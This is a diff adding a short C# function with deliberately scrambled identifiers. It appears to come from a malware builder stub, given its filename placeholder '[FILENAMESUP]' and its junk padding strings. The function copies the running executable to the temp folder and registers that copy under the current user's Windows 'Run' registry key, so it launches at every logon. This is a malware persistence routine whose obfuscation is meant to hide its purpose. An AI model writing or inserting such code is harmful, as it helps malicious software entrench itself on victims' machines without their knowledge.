@@ -1,0 +1,27 @@
+static void fAdsfinDD1CC4A1(string KK9KK7JJ4JJ3, [Optional, DefaultParameterValue(true)] bool AA2AA4AA6AA4AA4 )
+{
+string AA1AA3KK4KK2JJ3;
+string AA2KK2st = Path.GetTempPath() + "loc.txt";
+if(File.Exists(AA2KK2st))
+{
+AA1AA3KK4KK2JJ3 = File.ReadAllText(AA2KK2st);
+File.Delete(AA2KK2st);
+}
+else {AA1AA3KK4KK2JJ3 =System.Reflection.Assembly.GetExecutingAssembly().Location;}
+string zzAA3AA1 = Path.GetTempPath() + "[FILENAMESUP]";
+if(AA2AA4AA6AA4AA4)
+{
+//AA1BB6BB2(zzAA3AA1, File.ReadAllBytes(AA1AA3KK4KK2JJ3));
+if (AA1AA3KK4KK2JJ3 == zzAA3AA1)
+{
+Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(KK9KK7JJ4JJ3, zzAA3AA1);
+}
+else{
+File.Copy(AA1AA3KK4KK2JJ3, zzAA3AA1,true);
+Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(KK9KK7JJ4JJ3, zzAA3AA1);
+}}
+else 
+{
+zzAA3AA1 += "sofreakingRANDOM ad";
+}
+}
